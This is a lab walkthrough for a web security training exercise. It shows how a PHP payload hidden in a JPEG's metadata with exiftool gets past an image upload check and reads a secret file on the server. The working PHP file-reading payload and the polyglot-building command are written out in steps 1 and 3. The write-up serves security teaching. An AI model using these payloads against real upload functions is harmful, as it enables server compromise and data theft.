# Remote code execution via polyglot web shell upload
* This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image. it is still possible to upload and execute server-side code.
	* To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
	* You can log in to your own account using the following credentials: _wiener:peter_

### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* It returns an error message

![10](https://user-images.githubusercontent.com/53956303/152256025-6623a9e8-277b-45f4-bcfe-d91be3b28657.png)
### 3. Use `Exiftool` to inject a PHP command into a jpg file
* Download a png file from Google
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg 
mv image.jpg image.php
```
* The malicious image is successfully made

![109](https://user-images.githubusercontent.com/53956303/152257483-ec199ac0-c856-4851-b6cf-59914654f285.png)
* Upload this file using the upload panel.
	* It is successfully uploaded

![110](https://user-images.githubusercontent.com/53956303/152257734-5017f251-4fd0-4743-a7e4-d6a455aa3bc5.png)
### 4. Trigger the exploit via navigate the file using an web browser.
* From the image info, the file location is found

![111](https://user-images.githubusercontent.com/53956303/152257874-20a8064f-cd1d-4144-bfda-27a93c9a0337.png)
* Navigate to that location.
	* As a result, the PHP web shell is executed and the key is given

![112](https://user-images.githubusercontent.com/53956303/152257982-7fa4f4cd-b54f-4baa-9c23-24c9517ff8b7.png)
* By submitting the key, the lab is solved

![113](https://user-images.githubusercontent.com/53956303/152258112-86cf8e4b-6916-4eed-b0f7-33770060ca68.png)
